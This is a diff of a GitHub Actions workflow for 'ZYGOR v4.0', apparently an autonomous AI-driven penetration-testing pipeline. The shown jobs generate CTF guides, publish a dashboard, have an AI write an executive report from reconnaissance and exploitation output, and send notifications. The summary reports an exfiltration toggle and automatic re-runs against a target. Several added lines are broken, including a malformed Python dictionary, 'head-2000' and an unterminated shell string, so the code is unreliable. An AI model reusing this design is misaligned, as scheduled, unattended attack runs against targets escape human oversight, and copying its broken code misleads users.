           path: /opt/zygor/reports/social_engineering/
           if-no-files-found: warn
 
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
-  # JOB 6: CTF SOLVER
+  # CTF SOLVER
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
   ctf_solver:
     name: '🏁 CTF Solver'
     needs: [bootstrap]
-    runs-on: ${{ env.RUNNER }}
+    runs-on: ubuntu-latest
     timeout-minutes: 120
     if: |
       (github.event_name == 'schedule' || inputs.ctf_mode == 'true') &&
@@ -1116,29 +886,27 @@ jobs:
           echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
           mkdir -p /opt/zygor/reports/ctf
 
-      - name: '🏁 Generate CTF Guides'
+      - name: '🏁 Generate Guides'
         shell: bash
         run: |
-          for TYPE in web crypto reverse pwn forensics stego; do
-            ai_complete 4096 <<< "Write a CTF solving guide for $TYPE challenges. Include 10 common types, tools, commands, and example solutions." \
-              > /opt/zygor/reports/ctf/${TYPE}_guide.md 2>/dev/null || true
+          for t in web crypto reverse pwn forensics stego; do
+            ai_complete 4096 <<< "CTF guide for $t challenges. 10 types, tools, commands." > /opt/zygor/reports/ctf/${t}_guide.md 2>/dev/null || true
           done
 
-      - name: '📤 Upload'
+      - uses: actions/upload-artifact@v4
         if: always()
-        uses: actions/upload-artifact@v4
         with:
           name: ctf-guides-${{ github.run_id }}
           path: /opt/zygor/reports/ctf/
           if-no-files-found: warn
 
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
-  # JOB 7: DASHBOARD
+  # DASHBOARD
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
   dashboard_generator:
     name: '📊 Dashboard'
     needs: [bootstrap, reconnaissance, exploitation]
-    runs-on: ${{ env.RUNNER }}
+    runs-on: ubuntu-latest
     timeout-minutes: 60
     if: always()
     steps:
@@ -1149,42 +917,39 @@ jobs:
           export PATH="/opt/zygor/bin:$PATH"
           echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
 
-      - name: '📊 Generate Dashboard'
+      - name: '📊 Generate'
         shell: bash
         run: |
           python3 /opt/zygor/bin/generate_dashboard.py "$TARGET" > /opt/zygor/reports/dashboard/index.html 2>/dev/null || true
-          echo "Dashboard: $(wc -c /opt/zygor/reports/dashboard/index.html 2>/dev/null) bytes"
 
-      - name: '📤 Deploy to GitHub Pages'
+      - name: '📤 Deploy to Pages'
         shell: bash
         run: |
-          mkdir -p /tmp/gh_pages
-          cp /opt/zygor/reports/dashboard/index.html /tmp/gh_pages/index.html
-          cd /tmp/gh_pages
+          cp /opt/zygor/reports/dashboard/index.html /tmp/index.html
+          cd /tmp
           git init
           git checkout -b gh-pages
           git config user.email "zygor@pentest.ai"
           git config user.name "ZYGOR"
           git add .
-          git commit -m "📊 Dashboard $(date -u)" 2>/dev/null || true
+          git commit -m "Dashboard $(date -u)" 2>/dev/null || true
           git remote add origin "https://x-access-token:${GITHUB_TOKEN_ABORT}@github.com/${GITHUB_REPOSITORY}.git" 2>/dev/null || true
-          git push -f origin gh-pages 2>/dev/null && echo "✅ Pages deployed" || echo "⚠️ Deploy failed"
+          git push -f origin gh-pages 2>/dev/null || true
 
-      - name: '📤 Upload'
+      - uses: actions/upload-artifact@v4
         if: always()
-        uses: actions/upload-artifact@v4
         with:
           name: dashboard-${{ github.run_id }}
           path: /opt/zygor/reports/dashboard/
           if-no-files-found: warn
 
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
-  # JOB 8: EXECUTIVE REPORT
+  # EXECUTIVE REPORT
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
   executive_report:
-    name: '📊 Executive Report'
+    name: '📊 Report'
     needs: [bootstrap, reconnaissance, exploitation, web_forge, dashboard_generator]
-    runs-on: ${{ env.RUNNER }}
+    runs-on: ubuntu-latest
     timeout-minutes: 120
     if: always()
     steps:
@@ -1195,113 +960,100 @@ jobs:
           echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
           mkdir -p /opt/zygor/reports/final
 
-      - name: '📊 AI Generates Report'
+      - name: '📊 AI Report'
         shell: bash
         run: |
-          COLLECTED=""
+          DATA=""
           for f in /tmp/recon/*.txt /tmp/recon/*.nmap /tmp/exploit_output/*.txt; do
-            [ -f "$f" ] && COLLECTED+="$(cat $f 2>/dev/null | head -2000)\n"
+            [ -f "$f" ] && DATA+="$(cat $f 2>/dev/null | head-2000)\n"
           done
 
-          cat > /opt/zygor/reports/final/EXECUTIVE_SUMMARY.md << 'HEADER'
-          # ZYGOR v4.0 – AUTONOMOUS PENETRATION TEST EXECUTIVE SUMMARY
-          **Generated:** $(date -u)
-          **Target:** ${TARGET}
-          **AI Model:** ${AI_MODEL}
-          **Phase:** ${PHASE}
-          **Run ID:** ${GITHUB_RUN_ID}
-          ---
-          HEADER
+          {
+            echo "# ZYGOR v4.0 Executive Summary"
+            echo "**Target:** ${TARGET}  "
+            echo "**Run:** ${GITHUB_RUN_ID}  "
+            echo "---"
+            ai_complete 16384 <<< "Pentest executive report from data:\n${DATA:0:30000}\nInclude: summary, risk table, findings, remediation."
+          } > /opt/zygor/reports/final/EXECUTIVE_SUMMARY.md 2>/dev/null
 
-          ai_complete 16384 <<< "Generate pentest executive summary. Assessment data:\n${COLLECTED:0:30000}\nInclude: executive summary, risk table, findings, remediation roadmap, compliance mapping." \
-            >> /opt/zygor/reports/final/EXECUTIVE_SUMMARY.md 2>/dev/null || true
+          echo "Complete" > /opt/zygor/reports/final/OPERATION_SUMMARY.txt
 
-          echo "Operation complete" > /opt/zygor/reports/final/OPERATION_SUMMARY.txt
-
-      - name: '📧 Email Report'
+      - name: '📧 Email'
         shell: bash
         env:
           SENDGRID_API_KEY: ${{ secrets.SENDGRID_API_KEY }}
         run: |
           if [ -n "$REPORT_EMAIL" ] && [ -n "$SENDGRID_API_KEY" ]; then
-            REPORT=$(cat /opt/zygor/reports/final/EXECUTIVE_SUMMARY.md 2>/dev/null | head -c 15000)
             python3 -c "
-            import json, urllib.request
-            payload = json.dumps({
-                'personalizations': [{'to': [{'email': '$REPORT_EMAIL'}]}],
-                'from': {'email': 'zygor@pentest.local'},
-                'subject': 'ZYGOR v4.0 Pentest Report',
-                'content': [{'type': 'text/plain', 'value': '''$REPORT'''}]
-            })
-            req = urllib.request.Request('https://api.sendgrid.com/v3/mail/send', data=payload.encode(),
-                headers={'Authorization': 'Bearer $SENDGRID_API_KEY', 'Content-Type': 'application/json'})
-            print(urllib.request.urlopen(req, timeout=30).status)
-            " 2>/dev/null || true
+import json, urllib.request
+p = json.dumps({
+    'personalizations':[{'to':[{'email':'$REPORT_EMAIL'}]}],
+    'from':{'email':'zygor@pentest.local'},
+    'Zygor':'subject':'ZYGOR Report',
+    'content':[{'type':'text/plain','value':open('/opt/zygor/reports/final/EXECUTIVE_SUMMARY.md').read()[:15000]}]
+})
+urllib.request.urlopen(urllib.request.Request('https://api.sendgrid.com/v3/mail/send', data=p.encode(),
+    headers={'Authorization':'Bearer $SENDGRID_API_KEY','Content-Type':'application/json'}), timeout=30)
+" 2>/dev/null || true
           fi
 
-      - name: '🔔 Completion Notify'
+      - name: '🔔 Notify Complete'
         shell: bash
         run: |
-          MSG="✅ ZYGOR Operation Complete\n🎯 ${TARGET}\n📊 Report generated\n🆔 ${GITHUB_RUN_ID}"
-          [ -n "$DISCORD_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py discord "$MSG" "$DISCORD_WEBHOOK" 2>/dev/null || true
-          [ -n "$SLACK_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py slack "$MSG" "$SLACK_WEBHOOK" 2>/dev/null || true
+          MSG="✅ [ -n "$DISCORD_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py discord "✅ ZYGOR Complete\n🎯 ${TARGET}\n🆔 ${GITHUB_RUN_ID}" "$DISCORD_WEBHOOK" 2>/dev/null || true
+          [ -n "$SLACK_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py slack "✅ ZYGOR Complete\n🎯 ${TARGET}\n🆔 ${GITHUB_RUN_ID}" "$SLACK_WEBHOOK" 2>/dev/null || true
 
-      - name: '📤 Upload'
+      - uses: actions/upload-artifact@v4
         if: always()
-        uses: actions/upload-artifact@v4
         with:
           name: ZYGOR-Report-${{ github.run_id }}
           path: /opt/zygor/reports/final/
           if-no-files-found: warn
 
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
-  # JOB 9: CLEANUP
+  # CLEANUP
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
   cleanup:
     name: '🧹 Cleanup'
     needs: [executive_report]
-    runs-on: ${{ env.RUNNER }}
+    runs-on: ubuntu-latest
     timeout-minutes: 60
     if: always()
     steps:
       - name: '📊 Final Summary'
         shell: bash
         run: |
-          echo ""
-          echo "═══════════════════════════════════════════════════════"
-          echo "  ⚡ ZYGOR v4.0 OPERATION COMPLETE ⚡"
-          echo "═══════════════════════════════════════════════════════"
-          echo ""
-          echo "  Target:     ${TARGET}"
-          echo "  Phase:      ${PHASE}"
-          echo "  AI Model:   ${AI_MODEL}"
-          echo "  Exfil:      ${ENABLE_EXFIL}"
-          echo "  Duration:   ${MAX_HOURS}h"
-          echo "  Run ID:     ${GITHUB_RUN_ID}"
-          echo ""
-          echo "  ✅ Bootstrap"
-          echo "  ✅ Reconnaissance"
-          echo "  ✅ Exploitation"
-          echo "  ✅ Web Forge"
-          echo "  ✅ Dashboard"
-          echo "  ✅ Report"
-          echo ""
-          echo "  🔄 Next run triggered in ~${MAX_HOURS}h"
-          echo "═══════════════════════════════════════════════════════"
-
+          echo "══════════════════════════════════════"
+          echo "  ZYGOR v4.0 COMPLETE"
+          echo "══════════════════════════════════════"
+          echo "  Target: ${TARGET}"
+          echo "  Phase:  ${PHASE}"
+          echo "  Exfil:  ${ENABLE_EXFIL}"
+          echo "  Run:    ${GITHUB_RUN_ID}"
+          echo "  Next:   ~${MAX_HOURS}h auto-trigger"
+          echo "══════════════════════════════════════"
           {
             echo "ZYGOR v4.0 Summary"
             echo "Target: ${TARGET}"
             echo "Phase: ${PHASE}"
             echo "AI: ${AI_MODEL}"
             echo "Run: ${GITHUB_RUN_ID}"
-            echo "Completed: $(date -u)"
           } > /opt/zygor/reports/final/OPERATION_SUMMARY.txt
 
-      - name: '📤 Upload Summary'
+      - uses: actions/upload-artifact@v4
         if: always()
-        uses: actions/upload-artifact@v4
         with:
           name: ZYGOR-Summary-${{ github.run_id }}
           path: /opt/zygor/reports/final/OPERATION_SUMMARY.txt
           if-no-files-found: warn
+
+# ═══════════════════════════════════════════════════════════════════════════════════════════════════
+# REQUIRED SECRETS:
+#   TELEGRAM_BOT_TOKEN    (for Telegram bot)
+#   GROQ_API_KEY          (AI fallback)
+#   GEMINI_API_KEY        (AI fallback)
+#   SHODAN_API_KEY        (OSINT)
+#   SENDGRID_API_KEY      (email reports)
+#   AWS_ACCESS_KEY_ID     (S3 backup)
+#   AWS_SECRET_ACCESS_KEY (S3 backup)
+# ═══════════════════════════════════════════════════════════════════════════════════════════════════
